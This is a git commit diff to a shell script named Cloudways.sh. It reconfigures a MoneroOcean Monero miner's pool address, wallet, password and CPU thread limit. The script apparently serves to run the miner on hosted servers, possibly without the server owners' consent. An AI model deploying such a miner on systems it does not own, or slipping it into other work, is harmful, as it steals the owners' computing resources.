8aab2278644364956fefd0cd40de973f9dc33ca7
junaidd007 <junaidd007@users.noreply.github.com>
2021-08-02 03:20:32 +0400

    Update Cloudways.sh

--- Cloudways/MO/Cloudways.sh
+++ Cloudways/MO/Cloudways.sh
@@ -226,8 +226,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
-sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:443",/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 50,/' $HOME/moneroocean/config.json
